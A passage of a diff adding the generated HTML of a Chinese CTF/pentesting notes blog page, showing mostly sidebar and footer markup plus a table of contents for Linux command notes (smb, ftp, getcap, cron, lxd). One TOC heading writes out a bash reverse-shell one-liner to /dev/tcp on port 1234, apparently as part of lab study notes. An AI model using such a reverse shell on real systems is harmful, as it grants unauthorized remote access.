class="nav-text">smb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Samba-%E7%AE%80%E4%BB%8B"><span class="nav-text">Samba 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD"><span class="nav-text">主要功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-text">主要配置文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smbclient-%E5%8F%82%E6%95%B0%E5%92%8C%E4%BD%BF%E7%94%A8"><span class="nav-text">smbclient 参数和使用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ftp"><span class="nav-text">ftp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E4%BA%A4%E4%BA%92%E5%91%BD%E4%BB%A4%EF%BC%88%E7%99%BB%E5%BD%95%E5%90%8E%E4%BD%BF%E7%94%A8%EF%BC%89"><span class="nav-text">常用交互命令（登录后使用）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getcap"><span class="nav-text">getcap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%83%BD%E5%8A%9B%EF%BC%88Capabilities%EF%BC%89%E7%A4%BA%E4%BE%8B"><span class="nav-text">能力（Capabilities）示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ln"><span class="nav-text">ln</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-6"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bash-i-dev-tcp-ip-1234-0-1"><span class="nav-text">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;1234 0&gt;&amp;1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash-i"><span class="nav-text">bash -i</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dev-tcp-192-168-240-83-1234"><span class="nav-text">&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-1"><span class="nav-text">0&gt;&amp;1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stty-raw-echo-fg-%E7%BE%8E%E5%8C%96%E7%BB%88%E7%AB%AF"><span class="nav-text">stty raw -echo; fg (美化终端)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%93"><span class="nav-text">–</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pts"><span class="nav-text">pts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#docker"><span class="nav-text">docker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wc"><span class="nav-text">wc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-7"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sulogin"><span class="nav-text">sulogin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cron%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-text">cron定时任务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lxd"><span class="nav-text">lxd</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayukakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayukakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/48411.html" title="posts&#x2F;48411.html">HMV-Five</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/38113.html" title="posts&#x2F;38113.html">SWPUCTF_2022新生赛(web)WP</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50600.html" title="posts&#x2F;50600.html">HMV-insomnia</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62818.html" title="posts&#x2F;62818.html">寒假总结</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/25446.html" title="posts&#x2F;25446.html">SWPUCTF_2021新生赛(web)WP</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
